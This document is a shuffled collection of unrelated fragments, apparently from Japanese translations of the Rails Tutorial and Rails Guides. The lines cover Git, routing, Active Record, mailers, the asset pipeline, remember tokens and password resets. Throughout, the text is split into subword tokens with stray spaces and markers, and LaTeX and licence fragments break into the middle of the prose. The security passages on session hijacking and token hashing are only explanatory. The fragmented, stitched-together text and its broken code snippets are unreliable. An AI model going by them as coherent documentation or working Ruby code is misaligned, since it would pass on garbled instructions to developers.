▁\ ref { sec : git _ commands } で \ k ode { git ▁commit ▁- a ▁- m ▁" Message "} という Git コマンドを実行 した ことを思い出してください ▟ あのときは ▁“ すべて を変更 ” ▁(\ k ode { - a }) ▁ オプション と コミットメッセージ を追加する オプション ▁(\ k ode { - m }) ▁ を使用しました 。
▁invoke ▁ scss
▁ここで 入力 した もの は \ emph { 文字列 リテラル } と呼ばれ ▁( 面 白 い ことに \ emph { リテラル 文字列 } とも 呼 ば れ ます ) 、 ダブルクォート \ k ode { "} ▁ で 囲 む ことで 作成 できます 。
▁たとえば 、1 つの 部品 ( Part ) が 複数の 組み 立 て ( As se mb ly ) で使用され 、 組み 立 て を含む 実際の モデル名 が ` G ad get ` である場合 、 次のように 設定 します 。
▁ 記憶トークン を さらに セキュア に するためには 、 新しい セッション を作成する たびに トークン を更新する のが よい 方法 です ▟ この 方法 なら 、 攻撃者が 盗 んだ cookies を使用して 本 物 のユーザー になり す ま して サインイン し よう と する ▁(\ href { http :// en ▖ w ikipedia ▖ org / wiki / Session _ hijack ing } { セッションハイジャック }) ▁ ことが あって も 、 ユーザーが 次 回 サインイン するときに は トークン が 期限切れ になります 。
▁ユーザーの \ k ode { edit } アクション
▁### ▁ マルチ パ ート メールを送信 する
▁ これが なければ 友 達 リクエストを ば ら ま く ということは できない 相 談 だった でしょう 。
▁# ▁# ▁=> ▁< label ▁for =" article _ title " ▁class =" title _ label "> A ▁short ▁title </ label >
▁### ▁ 等 幅 フォント
▁ リソース を追加して 標準的な RESTful アクションを get できるように する
▁(\ ref { sec : render ing _ microposts } でも 説明したように 、 次のような コードは
▁ したがって 、 この時点で ` deliver _ later ` を使用して メールを送信 できます ▟ また 、 メールを 後で バ ッ ク グ ラ ウ ンド ジョブ から 送信 したい場合は 、 S ide k i q や Re s q ue などの バックエンド クエリ システム を使用する よう Active ▁Job を設定する だけで済みます 。
▁ rspec ▁ guard ▁added ▁to ▁ Guardfile , ▁feel ▁free ▁to ▁edit ▁it
▁この ファイル には 必要な ファイル をすべて 順 に記述 するか 、 あるいは 単 に ` require _ tree ` と 記 述 します 。
▁上のように することで 、 この コントローラの ` index ` アクション に対して ` GET ` リクエストを送信し よう と している ことが アプリケーション によって 認 識 され 、 かつ そのために アプリケーションの ルーティング ではなく エンジンの ルーティング が 使用される ようになります 。
▁このコードは リスト \ ref { code : signin _ create _ user _ instance } で使用されていました ▟ もうひとつ 、
▁<%= ▁ video _ tag ▁" mov i e ▖ ogg " ▁%>
▁ 先ほど と同様に \ k ode { static \_ pages \_ controller ▖ rb } という コントローラ が生成されます 。
▁ チェックボックス は 、 他の ラベル 、 テキストフィールド 、 パスワード フィールド 、 送信 ボタン と同様に ヘルパーメソッド で 作成 できます 。
▁Rails の 公式 リポジトリ から 新しい コミット と ブランチ を ダウンロード します 。
▁1 つの リクエスト の中で の 接続 は 常に 次のような 流れ になります : ▁ 初 回 は データベース アクセス の 必要な 接続 を 確 保 し 、 以後 はその 接続 がある ことを 再 確認し ます ▟ リクエスト の 終わり では 、 キュー で 待 機 する 次 以降 の リクエスト に 備えて 接続 ス ロ ッ ト が 追加 で 利用 できるようになります 。
▁' multi _ json ' を Gemfile に追加する 。
▁\ k ode { user } に 紐 付 いた マイクロポスト を作成する
▁ 今回は \ k ode { assert _ difference } という メソッドを使って テストを 書き ます 。
▁これは 、 静的なページ の 集合 に対して は 、 適切な アクションと 言えます ▟ 言い 換 え ると 、 REST アーキテクチャ は 、 あらゆる 問題 に対して 最適な 解決 方法 である とは 限 らない ということです 。
▁person ▖ errors ▖ to _ a
▁` application ▖ rb ` で 以下のように ` config ▖ active _ job ▖ queue _ name _ prefix ` を使用することで 、 すべての ジョブ で キュー 名 の 前に 特定の 文字列 を追加する ことができます 。
▁この ファイルは ` rails ` コマンドで 拡張 可能 であり 、 方法は コメント に 示 されています 。
▁最後に 、 以下のように マイクロポストの 現在の 数 の カウント を追加します 。
▁ ログイン の状態 に応じて 、 レイアウト 上の リンク などの 機能 を変更 できます 。
▁ このような シ ン タ ッ ク ス シ ュ ガ ー は 、 多数 ある 引数 が 順序 に依存する ことを 避 け 、 名前付き パラメータを エ ミ ュ レ ート する インターフェイス を提供 するために Rails で 多 用 されています 。
▁( コントローラのアクション については \ ref { sec : mvc _ in _ action } で 詳 しく 解説します ) 。
▁Relationship リソース 用の ルーティング を追加する
▁{0} 図 2▖1 4 {/0} ▁{1} マイクロポストの 作成 に 失敗した場合 の エラーメッセージ {/1}
▁<%= ▁f ▖ label ▁: title , ▁' Title ' ▁%> :
▁| ▁ 設定 ▁| ▁ 説明 ▁|
▁上のコードでは 、` Article ` の show ページに フォーム が 1 つ 追加 されています ▟ この フォーム は ` Comments Controller ` の ` create ` アクション を呼び出す ことで コメント を 新規 作成します 。
▁ セッションハイジャック は 、 セキュリティ上の 注意 を 呼 び かけ るために これを 実 演 する \ href { http :// code but ler ▖ com / f iresheep } { F iresheep } アプリケーション によって 広 く 知 られる ようになりました ▟ F iresheep を使用すると 、 公 共 W i - Fi ネットワーク 経由で 接続 したときに 多くの 有 名 Web サイトの 記憶トークン が 丸 見え になっている ことがわかります 。
▁ 画像 付き マイクロポストを 投 稿 した とき のモックアップ
▁adapter : ▁ sqlite 3
▁\ href { http :// localhost :3000/ static _ pages / home }{/ static \_ pages / home } にアクセス して 結果 を表示します ▁( 図 \ ref { fig : raw _ home _ view }) 。
▁この クラス と メソッドは 以下のように 使う ことができます 。
▁**` ActionDispatch :: Request I d ` **
▁# ▁ そう することで 認 証 のコード が わかりやすく なる
▁リスト \ ref { code : feed _ final } を も って 、 ステータスフィード の実装 は 完了 です 。
▁リスト \ ref { code : image _ uploader _ production } ▁uses ▁the ▁\ k ode { production ?}
▁\ k ode { Gemfile } に \ k ode { annotate } ▁gem を追加する 。
▁### ▁` multiple _ of ?
▁Ruby では \ k ode { de f } という キーワード を使って メソッド を定義する
▁Rails はこの メソッドを ある 場所 で 使用 し ており 、 ルーティング コード でも 使用 しています 。
▁ユーザー 一覧 と ページネーション に対するテスト
▁ 箇 条 書き の 点 を追加する こともできます 。
▁ パスワード再設定の 期限切れ のテスト
▁ ファイルを コンパイル する 際の デフォルトの マッチ ャ によって 、` app / assets ` フォルダ 以下の ` application ▖ js `、` application ▖ css ` 、 および すべての 非 JS / CSS ファイル ▁( これにより 画像ファイル も すべて 自動的に インクルード されます ) ▁ が インクルード されます ▟ ` app / assets ` フォルダ にある gem も含まれます 。
▁0 から 23 まで の 時 を オプション に 持ち 、 現在 時刻 が 選択 されている select タグを返します 。
▁ 適切に マイクロポストの 破 棄 をテストするために 、 最初に ローカル変数 で 指定された ユーザーの ポスト を取得し 、 次に ユーザーを 破 棄 します 。
▁ アセットパイプライン を 手動で 有効 にする 場合は 、 これらの コメントアウト も 解除 する必要があります 。
▁ ソース に `: all ` を指定すると 、` app / assets / javascripts ` ディレクトリ 以下 にある JavaScript ファイル をすべて インクルード できます 。
▁ コレクション が 空 の場合 、` render ` は nil を返します ▟ 以下のような 簡単な 方法 でも よい ので 、 代 わ り の コンテンツ を表示する ようにしましょう 。
▁この 設定 は ` scaffold ` ジェネレータ の実行 中に 使用されます 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / object / json ▖ rb ` です 。
▁ デフォルトの \ k ode { has \_ many ▁through } という 関連付け では 、 Rails は モデル名 ( 単数形 ) に対応する 外部キー を探し ます 。
▁ 大きな 流れ としては 、 ユーザー への レスポンス として 送信 すべき 内容 を 決定 すること と 、 ユーザー への レスポンス を作成する ために 適切な メソッドを呼び出す ことも この 作業 に 含 まれ ます 。
▁| ` deliveries ` | ` delivery _ method ▁: test ` を使用して Action ▁Mailer から 送信された メール の配列 を保持し ます 。
▁has _ many ▁: comments , ▁ dependent : ▁: destroy
▁ ╼\ end { enumerate }╼╼ ▁% ▁subsection ▁a _ problem _ with _ the _ data _ model ▁( end )╼╼ ▁\ subsection { User / relationship の関連付け } ▁% ▁( fold )╼ ▁\ label { sec : relationship _ user _ associations }╼╼
▁ コンソール に 戻 って \ k ode { password \_ digest } 属性 を参照 してみる と 、 リスト \ ref { code : password _ implementation } の \ k ode { has \_ secure \_ password } の 効果 を 確 認 できます 。
▁" hello ▁world "
▁`: controller ` シンボル や `: action ` シンボル は 、 ルーティング 内で 明示的に 指定 する必要はありません 。
▁これらの メソッド を使用したい場合 は 、 Gemfile に ` gem ▁' respond ers ', ▁' ~ > ▁2▖0 ' ` と 記 述 するだけで 利用できます 。
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁ セッション を削除する ▁( ユーザーの サインアウト ) 。
▁Home ページの タイトル 確 認 用に テスト を更新する
▁つまり 、 新しい ユーザー オブジェクト を作成するとき に 余分な 作業 を行わ ずに 済 む ということです 。
▁\ k ode { before \_ save } コールバック の 別の 実装
▁この ヘルパー のデフォルト エラーメッセージ は ▁_" must ▁be ▁accepted " _ ▁ です 。
▁Active ▁Record には 、 オブジェクト を検索する ための 方法 がいくつも あります 。
▁class _ eval ▁<< - E O T , ▁ _ _ FIL E _ _ , ▁ _ _ L IN E _ _
▁#### ▁ 正 規 の 定数名
▁" activation _ digest "
▁#### ▁` transform _ keys ` と ` transform _ keys !
▁* ▁scope ▖
▁つまり 、 以前の コミット を \ k ode { checkout } コマンド ▁( と 、 現在 まで の 変更を 強制的に 上書き して 元に戻す ための \ k ode { - f } フラグ ) ▁ で チェック ア ウ ト すれば 、 簡単に 削除 前 の状態 に 戻 す ことができます 。
▁ サインイン 失敗 時の テスト 。
▁これで 、 ログイン ユーザーの 記 憶 処理を 作る 準備が整いました ▟\ k ode { remember } ヘルパーメソッド を追加して 、\ k ode { log \_ in } と 連 携 させ ます ▁( リスト \ ref { code : log _ in _ with _ remember }) 。
▁上の 場合 、 パーシャル の名前 は ` _ product ` であり 、 この ` _ product ` パーシャル 内で ` product ` という名前の 変数 を使用して 、 出力 される インスタンス を 取得 できます 。
▁ 名前付きルート を定義する ため 、 以下のような ルール を 置き換え ます 。
▁Rails ▁4 では ` sass - rails `、` coffee - rails `、` uglifier ` ▁gem が自動的に Gemfile に追加されます ▟ Sprockets は アセット 圧縮 の 際に これらの gem を使用します 。
▁ アカウント有効化 メール の場合 ▁(\ ref { sec : account _ activation _ mailer }) ▁ と同様 、 Rails の メール プレビュー 機能 で パスワード再設定の メールを プレビュー しましょう 。
▁今度は ` app / views / articles / new ▖ html ▖ erb ` ビューを 完全に 書き 直 して 、 今 作成した パーシャル を ここで 使って みましょう 。
▁Active ▁Record は 、 ユーザーに 代 わ って データベースに クエリ を 発行し ます ▟ 発 行 される クエリ は 多くの データベース システム ▁( MySQL 、 PostgreSQL 、 SQLite など ) ▁ と 互換性 があります 。
▁ //= ▁require ▁t i cket s
▁has _ one ▁: account ,
▁self を省略した 結果を リスト \ ref { code : current _ user _ wrong } に示します 。
▁< p >
▁ これを行うには 、` find ` メソッドの 呼び出し 時に 主キー の配列 を 渡します 。
▁もし 自分 が 混 乱 し 始 め ている と 感じ たら 、 まずは この章 の最後 まで 進 め 、 それ から もう一度 この章 全体 を 読み 返 してみてください ▟ 読み 返す ことで より よく 理解 できる と思います 。
▁\ label { fig : page _ flow _ home _ page _ feed _ mockup } }╼\ end { figure }╼╼ ╼ ▁\ section { Relationship モデル } ▁% ▁( fold )╼ ▁\ label { sec : the _ relationship _ model }╼╼
▁ 公開鍵 の 追加 が 終わったら 、[ Create ] ▁ をクリックして \ href { https :// bitbucket ▖ org / repo / create } { 新しい リポジトリを 作成 } します ▁図 \ ref { fig : create _ first _ repository }) 。
▁* ▁` lib / blorgh / engine ▖ rb ` ファイルは 、 Rails アプリケーションが 標準 で 持つ ` config / application ▖ rb ` ファイル と 同 一 の 機能 を持ちます 。
▁# ▁gem ▁' rb - not if u ', ▁' 0 ▖ 0 ▖ 4 '
▁{0} 図 6 ▖ 4 {/0} ▁{1} 素晴らしい 正規表現 エディタ \ href { http :// www ▖ rubular ▖ com /}{ Rubular }{/1}
▁[[1, ▁2 ] , ▁[ 2, ▁3] , ▁[ 3 , ▁4 ]] ▖ sum ▁# ▁=> ▁[1, ▁2, ▁2, ▁3 , ▁3 , ▁4 ]
▁* ▁` add _ generator _ template s `: ▁ アプリケーション や railties や エンジン にある ` lib / template s ` ディレクトリ にある ジェネレータ 用の テンプレート を探し 、 それら を ` config ▖ generator s ▖ template s ` 設定 に追加します ▟ この 設定 によって 、 すべての ジェネレータ から テンプレート を参照 できるようになります 。
▁\ k ode { join } メソッド ▁(\ ref { sec : array s _ and _ range s }) ▁ を使用すれば 、 id を 集 め た 文字列を 以下のように カ ン マ 区切り で つ な げ ることもできます 。
▁redirect _ to ▁articles _ path
▁{0} 図 11 ▖ 14 {/0} {1} フォローしているユーザー 用 ページのモックアップ ▟\ href { http :// railstutorial ▖ org / images / figures / following _ mockup _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁* ▁H E A D リクエストを ` GET ` に変換 して 処理 します ▟ その 上で body を 空 にした レスポンス を返します ( 訳 注 : ▁Rails 4 ▖ 0 から は Rack :: Head を使う ように 変更 されています ) 。
▁* ▁`: title ` は リンク の タイトル を指定します 。
▁end
▁[ remember ▁me ] ▁ チェックボックス のモックアップ
▁### ▁` length `
▁next _ week
▁ サンプルアプリケーションの \ k ode { Gemfile } に Spork を追加する 。
▁#### ▁ 関連付けられたオブジェクト が存在する かどうかを確認 する
▁これらの ディレクトリ 中の ファイルは 、 http :// example ▖ com / stylesheets のような リクエスト によって自動的に 配信 されます ▟ これは 3▖0 以降 も同様です 。
▁ 実際に 見 てみましょう 。
▁date ▖ end _ of _ minute ▁# ▁=> ▁Mon ▁Jun ▁ 07 ▁ 19 : 55 : 59 ▁+0200 ▁2010
▁### ▁Web ▁C on so le ▁gem
▁たとえば ` _ northwest ` を指定すると 、 Customer は ` customers _ northwest ` を テーブル として 探 します 。
▁CSS インジェクション の 説明 に 最適な のは 、 か の 有名な [ MySpace ▁ Sam y ワーム ]( http :// na mb ▖ la / po p ul ar / tech ▖ html ) です 。
▁`: shallow _ path ` オプションは 、 指定された パラメータを メンバー の パス の冒頭 に だけ 追加します 。
▁< option ▁value =" 5 "> J a p an </ option >
▁class ▁Person
▁#### ▁` belongs _ to ` 関連付け に対応する 外部キー を作成する
▁次の 行 では 、 「\ k ode { / static _ pages / home } の Home ページ にアクセス した とき 、 “ Sample ▁App ” という 語 が含まれ て い なければならない 」 と 記 述 しています 。
▁これらの アクション では 、\ emph { render } を \ k ode { 明示的に } 呼び出し ている ことに注意してください ▟ ここでは 、 作成 の 必要な \ emph { show _ follow } という ビューを 出力 しています 。
▁Date ▖ new (201 0, ▁2, ▁28 )▖ advance ( months : ▁1, ▁day s : ▁1)
▁この \ text tt { cookies ▖ permanent } メソッドでは 、 cookies が 20 年 後に 期限切れ になる ▁(\ text tt { 20 ▖ years ▖ from _ now }) ▁ ように 指定 しています が 、 これは Rails の \ emph { time ヘルパー } を使用した 格 好 の例 題 になります ▟ time ヘルパーは Rails によって 、 数値 関連の 基 底 クラス である \ text tt { Fi x n um } クラス に追加されます 。
▁ 実行 結果を 図 \ ref { fig : home _ page _ follow _ stats } に示します 。
▁\ k ode { email } 属性 の検証 に対するテスト
▁* ▁FROM ▁" articles " ▁WHERE ▁ trashed ▁= ▁0
▁Rails では 、 インスタンス変数 を作成する だけで ビューで 自動的に 使えるように なる という 点 に 主な 利用 価 値 があります が 、 一般的 には 、 インスタンス変数 は Ruby の その クラス 内の ど こ でも 利用 できるように したい 変数 として 使われ ます
▁ 最適な 方法は 状 況 によって 異 なり 、 たとえば \ emph { 極めて 多数 } の 静的なページ を 1 つの StaticPages コントローラ だけ ま か なお う と すると 重 荷 になる 可能性があります ▟ 今回は いくつかの 静的なページ を 作る だけ なので 、 重 荷 に はなりません 。
▁user / micropost 関連 メソッドの まとめ
▁#### # ▁` build _ association ( attributes ▁= ▁{}) `
▁第 \ ref { cha : filling _ in _ the _ layout }, 章では 、 新しい ユーザー を作成するための ス タブ ページを 作 った ところで 終わり ました ▁(\ ref { sec : user _ signup }) 。
▁* ▁ テキストエディタ : ▁ TextMate を含む 多くの テキストエディタ は 、 デフォルトで UT F -8 エンコード で テキスト を 保存 してくれます 。
▁| ▁POST ▁| ▁ / photos ▁| ▁photos # create ▁| ▁images _ path ▁|
▁* ▁ 次のような リテラル : ▁` nil `、` false `、` true `、` self `
▁### ▁ 単 体 の Active ▁Support サポート
▁<%= ▁link _ to ▁' M y ▁ Blog ', ▁controller : ▁' articles ' ▁%>
▁今回の場合 、\ k ode { full _ title } ヘルパーは サイトの すべての ページ で使用する ことを 前 提 に しています が 、 Rails には このような 場合 のための 特別な ヘルパー ファイル \ k ode { app / helpers / application _ helper ▖ rb } があります 。
▁ rm ▁< ファイル名 >
▁ ログイン 、 ログアウト が行われていない ので 、 誰 でも 無 制限 に 操作 できてしまいます 。
▁ ある ユーザー に対して \ k ode { current _ user } が 初めて 呼び出される 場合は \ k ode { find _ by } メソッド を呼び出します が 、 以後 の 呼び出し では データベース にアクセス せずに \ k ode {@ current _ user } を返します
▁╼╼ THE ▁S O F T W A RE ▁ IS ▁PR O V IDE D ▁" A S ▁ IS ", ▁ W IT H OUT ▁ W A R R A N T Y ▁O F ▁A N Y ▁ K IN D , ▁E X P RE S S ▁OR ╼ IM P L IE D , ▁ IN C L U D IN G ▁B UT ▁ NOT ▁LIMIT E D ▁T O ▁ THE ▁ W A R R A N T IE S ▁O F ▁M ER C HA N T A B I L IT Y ,╼ F IT N E S S ▁F O R ▁A ▁P A R T I C U LA R ▁P U R P OS E ▁ AND ▁N ON IN F R IN G E M E N T ▖
▁# ▁=> ▁< input ▁id =" token " ▁name =" token " ▁type =" hidden " ▁value =" V U B J K B 23 U I V I 1 U U 1 V O B V I @ " ▁/>
▁ いずれ の場合 であっても 、\ emph { Ruby ▁on ▁Rails チュートリアル } を 最 後 まで 終 え る ことができ れば 、 Rails 周辺 の さらに 高度な 内容 の 書 籍 、 ブログ 、 スクリーンキャスト など を 読み 解 く 力 を 身 に 付け られます
▁ ST I を使用し ない としても 、 予 約 語 より 先に まず " con text " など のような 、 モデルの データを 適切に 表 す 語 を 検 討 してください 。
▁ここまで の 変更 で 、 アプリケーションの 外 観 は以下のような感じ になっている はずです 。
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁ 完 全 だ が まだ 動作 しない \ k ode { sign _ in } 関数 。
▁このとき 、 関連付け 用の インデックス も カラム 上に 作成されます 。
▁* ▁ 独自の ミドルウェアスタック を定義する 方法
▁たとえば 、 以下のような パーシャル を呼び出す とします 。
▁config ▖ autoload _ paths ▁ += ▁% W ( # { config ▖ root } / extra s )
▁<< E OS ▖ indent (2)
▁| ▁| ▁4 15 ▁| ▁: un support ed _ media _ type ▁|
▁デフォルトでは 、 before フィルター は コントローラ内の \ emph { すべての } アクションに 適用 される ので 、 ここでは 適切な \ k ode { : only } オプション ハッシュ を 渡す ことによって \ k ode { : edit } と \ k ode { : update } アクションに のみ この フィルタ が 適用 される ように 制限 を かけ ています 。
▁また 、 パスワードを 忘れ た 時の 再設定 手順 も \ ref { sec : password _ reset } で実装した とおり に 動作する はずです ▁( 図 \ ref { fig : reset _ email _ production }) 。
▁### ▁ Spring
▁ } Micropost と その User は ▁\ k ode { belongs \_ to } ▁( 1 対 1 ) ▁ の関係 性 がある
▁< th > S um m ary </ th >
▁ Apache の設定 :
▁ 署 名 付き cookies は 、 その Rails アプリケーション で生成された ことが 確 認 でき 、 不 正 が 防止 される という 意味 では 安全 です 。
▁この節では 、 主 に \ k ode { app / controllers } ディレクトリ や \ k ode { app / views } ディレクトリ 内で 作業を 進 め ます
▁ 「\ k ode { ?} 」 〜 「\ k ode { : }」 という 記 法 については \ ref { sec : remember _ me _ checkbox } で 解説します 。
▁ months _ since
▁d ▖ end _ of _ quarter ▁# ▁=> ▁We d , ▁30 ▁Jun ▁2010
▁About ページ のテスト
▁次に 、 いつものように \ k ode { bundle ▁install } を実行します 。
▁ ありがたい ことに 、 Rails には そのような 失敗 をカバー する 機能 がいくつも あります 。
▁ 画像 付き マイクロポストを 投 稿 した結果
▁* ▁` config ▖ assets ▖ css _ compressor ` は 、 CSS の 圧縮 に使用する プログラム を定義します 。
▁" favicon ▖ ic o ":" favicon a 9 c 64 1 b f 2 b 8 1 f 04 76 e 87 6 f 7 c 5 e 37 59 6 9 ▖ ic o "," my _ image ▖ png " :
▁(\ k ode { header } タグ と同様 、\ k ode { footer } タグ も HTML 5 で 新たに 追加 された 要素 です ) 。
▁ 名前空間 や スコープ の内側に root を 置く こともできます 。
▁* ▁FROM ▁addresses
▁ すべての 製 品 ( products ) を出力する コード 例 は以下のようになります 。
▁ 追加する と 、\ k ode { micropost \_ params } メソッドは リスト \ ref { code : micropost _ params _ picture } のようになります 。
▁( We ’ ll ▁discuss ▁inheritance ▁brief ly ▁in ▁Section ▁\ ref { sec : inheritance _ hierarchies } ▁and ▁cover ▁both ▁subject s ▁in ▁more ▁detail ▁in ▁Section ▁\ ref { sec : ruby _ classes } ▖)
▁ アプリケーションの デプロイ は 必 須 ではありません が 、 頻繁に 本番環境 にデプロイする ことによって 、 開発 サイクル での 問題 を 早い 段階で 見つけ ることができます 。
▁Date : ▁Sun , ▁24 ▁Jan ▁2010 ▁09 : 25 : 18 ▁GMT
▁<%= ▁stylesheet _ link _ tag ▁" main ", ▁" columns " ▁%>
▁* ▁ 値が 配列 の場合 、 キーを `: root ` に 、 キーを 単数形 化 ▁( singularize ) ▁ したものを `: child re n ` に 指定 して 再帰的 な 呼び出し を行います 。
▁| ▁ --- ---------------- ▁| ▁ ---------------- ▁| ▁ ---------------- ---------------- ▁|
▁ その他の エンジン に関する ドキュメント については 、[ Devise ]( https :// github ▖ com / plat a format ec / devise ) ▁( 親 アプリケーションに 認 証 機能を 提供する エンジン ) ▁ や ▁[ For em ]( https :// github ▖ com / ra d ar / for em ) ▁( フ ォ ー ラ ム 機能を 提供する エンジン ) ▁ を参照してください 。
▁ そして 、 保存 して 削除 されていない オブジェクト の場合 、 どうやって データベースから ユーザー を取得する のでしょうか 。
▁validates ▁: orders _ count , ▁presence : ▁true
▁ 実際の ページ 作成 は \ ref { sec : following _ and _ followers _ pages } まで 行 いません が 、 ルーティング は 今 実装します ▁( リスト \ ref { code : following _ followers _ action s _ routes }) 。
▁ すぐ 想 像 が 付 く と思います が 、 ネスト が 深 くなる と た ち ま ち 扱 い が 厄 介 になります 。
▁d a v id ▁= ▁User ▖ find _ by ( name : ▁' David ')
▁# ▁See ▁ http :// help ▖ github ▖ com / i gnore - file s / ▁for ▁more ▁about ▁ignoring ▁files ▖
▁self を省略した 結果を リスト \ ref { code : user _ signin _ test _ valid _ information } に示します 。
▁ アセットパイプライン
▁ 有効化 ダイジェスト は データベースに保存 しておき 、 有効化トークン は メールアドレス と 一 緒 に 、 ユーザーに 送信する 有効化 用 メールの リンク に 仕 込 んで お く
▁このとき 、 既に ログイン 済み の ユーザーを 対象 と している ため 、 ログイン ページ ではなく ルート URL にリダイレクトし ている 点に注意 してください 。
▁P repared ▁Statements をオンに すると 、 Active ▁Record はデフォルトで データベース接続 ごとに 最大 ` 1 000 ` まで の P repared ▁Statements を作成します 。
▁Rails では この 内部 属性を 他の 場所 でも 若 干 使用 しています ▟ たとえば ビューで は以下のように 使用 しています 。
▁Client ▖ where ( created _ at : ▁( Time ▖ now ▖ midnight ▁- ▁1▖ day )▖ ▖
▁ ちなみに 、\ k ode { member } メソッド を使うと ユーザー id が含まれている URL を扱う ようになります が 、
▁ テストスイート を実行して 、 新しい コード に 問題 がない ことを確認してください 。
▁date ▁= ▁Date ▖ new (201 0, ▁6 , ▁7 )
▁ 実際 、 これ でも O K なのです ▟ bcrypt の \ href { https :// en ▖ w ikipedia ▖ org / wiki / S alt _ % 28 crypt o gr a ph y % 2 9 } { ハッシュ は ソ ル ト 化 されている } ので 、2 人のユーザー の パスワードが 本当に 一致する の かどうか は ハッシュ から は 絶 対 わ か り ません ▟ ( 訳 注 : ▁ 「 ソ ル ト 」 とは 、 暗 号 を 強 化 するために 加 え られる 任意の 短い 文字列 です ▟ 念 には 念 を 入 れ て 「 塩 ひとつ ま み 」 を加える という イ メ ー ジ であり 、 英語 の 「 take ▁it ▁with ▁a ▁gra in ▁of ▁ s alt 」 = 半 分 疑 って か か る という 言い 回 し が 語 源 です )
▁* ▁` test ` 環境 は 、 自動化 された テストを実行 するために使用されます 。
▁ここで 、\ k ode { PATCH } リクエストを 送 るために \ text tt { patch } メソッドを使って いることに注目してください ▟ これは \ text tt { get } や \ text tt { post }、\ text tt { delete } メソッド と同じように 、 HTTP リクエストを送信する ための メソッドです 。
▁ 削除 された ディレクトリ と ファイルが 無 事 復 旧 しました 。
▁============= ================
▁ 上に 述 べ た HTTP メソッドは 、 いずれも リソース に対して 特定の 操作 の実行 を 指示 する リクエスト です 。
▁ これを行なうには 、 メールアドレスを ` " フル ネ ーム ▁< メールアドレス > " ` の 形式で 指定します 。
▁ そのために 、 テキストエディタ で \ k ode { Gemfile } を開き ます
▁この リクエスト は 、 17 番目の ユーザーを 管理者 に 変 え てしまいます ▟ ユーザーの この 行 為 は 、 少なくとも 重大な セキュリティ 違 反 となる 可能性があります し 、 実際には それ だけで は 済 ま ない でしょう 。
▁ トークン を ハッシュ化 せずに データベースに保存 すると 、 トークン が 攻撃者 によって データベースから 読み 出 された ときに セキュリティ上の 問題が生じ ます : ▁ 攻撃者が ユーザーの メールアドレス に パスワード再設定の リクエストを送信し 、 この メール と 盗 んだ トークン を使用して 攻撃者が パスワード 再設定 リンクを 開 け ば 、 アカウント を 奪 い 取ること が できてしまいます 。
▁なお 、\ k ode { authenticate } が User オブジェクト を返す ことは 重要 ではなく 、 返 っ てきた 値 の 論理値 が \ k ode { true } であること が重要です 。
▁* ▁` references `
▁Client ▖ where (" orders _ count ▁> ▁10 ")▖ order (: name )▖ reverse _ order
▁NOTE : ▁Active ▁Job はデフォルトで ジョブ を ' : inline ' で 実行 します 。
▁Client ▖ exists ?
▁次の `@ article ▖ save ` で 、 この モデルを データベースに保存 します 。
▁ 初心者 が 学 び やすくするため に
▁ ul t s ▁of ▁\ k ode { rails ▁routes } ▁to ▁\ k ode { grep }, ▁list ▁all ▁the ▁routes ▁ associated ▁with ▁the ▁Users ▁resource ▖ ▁Do ▁the ▁same ▁for ▁Sessions ▖ ▁How ▁many ▁routes ▁does ▁each ▁resource ▁have ? ▁\ emph { Hint } : ▁Re f er ▁to ▁the ▁\ href { https :// www ▖ learn en ough ▖ com / command - line - tutorial # sec - grep p ing } { section ▁on ▁ grep } ▁in ▁\ le c l ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 06 1 c 5 c ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁sessions _ controller ▁( end )╼╼ ▁\ subsection { ログインフォーム } ▁% ▁( fold )╼ ▁\ label { sec : login _ form }╼╼
▁if ▁loaded ?
▁belongs _ to ▁: customer , ▁-> ▁ { ▁where ▁active : ▁true ▁ }
▁create _ table ▁: supplier s ▁do ▁| t |
▁=> ▁S at , ▁ 02 ▁Jan ▁2010 ▁0 3 : 3 9 : 14 ▁UTC ▁+00:00
▁| ▁GET ▁| ▁ / magazine s / : magazine _ id / ads ▁| ▁ ads # index ▁| ▁ ある 雑 誌 1 冊 に含まれる 広 告 をすべて 表示する ▁|
▁ 何 が テスト されている のか を 自分 が 理解 でき ている か 。
▁adapter : ▁ mysql 2
▁このメソッド で使用される 文法 は 、` ActiveRecord :: Base ▖ find ` で使用されている もの と同じ です 。
▁以下の コマンドを コマンドラインで 実行 し 、 Rails コンソール を 起動 しましょう 。
▁COM MIT
▁### ▁ ミドルウェアスタック の内容
▁( email フィールド と text フィールド は 同じ よう に見えます が 、 細 か な 点が 違い ます ▟ たとえば 、\ k ode { type =" email "} となっている 場合 、 モ バ イ ル 端 末 から 入力 フォーム を タ ッ プ すると 、 メールアドレス に 最適化 された 特別な キー ボ ー ド が表示される ようになります ▟)
▁rails ▁g ▁model ▁user ▁name : string
▁上の例では ` require ` と ` require _ tree ` という ディレクティブ が使用されています 。
▁\ emph { scaffold } ジェネレータ という スクリプト を使って アプリケーションを す ば や く 生成する 事 により 、 ▁ 高度な Rails プログラミング と Web プログラミング の概要 を 学びます 。
▁* ▁` config ▖ logger ` は 、 ロガー を指定します ▟ 指定 される ロガー は 、 Log 4 r または Ruby のデフォルトの ` Logger ` クラスの インターフェイス に従い ます 。
▁ 複数の スタイルシート ファイルを キャッシュ して 1 つの ファイルに することができます ▟ こうすることで スタイルシート ファイルの ダウンロード に必要な HTTP 接続 数を 減 ら す ことができ 、 速 度 が 向上 します ▟ g z ip 圧縮 すれば さらに 転 送 が 速 く なります 。
▁これらの ボタン は もう すぐ 動作する ようになります ▟ 実は この ボタン の実装 には 2 とおり の 方法があります ▟ 1 つ は 標準的な 方法 ▁(\ ref { sec : a _ working _ follow _ button _ the _ standard _ way }) 、 もう 1 つ は Ajax を使用する 方法 ▁(\ ref { sec : a _ working _ follow _ button _ with _ ajax }) ▁ です ▟ でも その前に 、 フォローしているユーザー と フォロワー を表示する ページ をそれぞれ 作成 して HTML インターフェイス を完成させ てしまい ましょう 。
▁$ ▁rails ▁generate ▁controller ▁ FooBar s ▁ baz ▁ q u u x
▁* ▁` increment _ counter `
▁\ k ode { self } という キーワード を使用し ない と 、 Ruby によって \ k ode { remember \_ token } という名前の \ emph { ローカル } 変数 が作成され てしまいます ▟ この動作 は 、 Ruby における オブジェクト 内部 への 要素 代入 の 仕 様 による ものです ▟ 今 欲 しい のは ローカル変数 ではありません 。
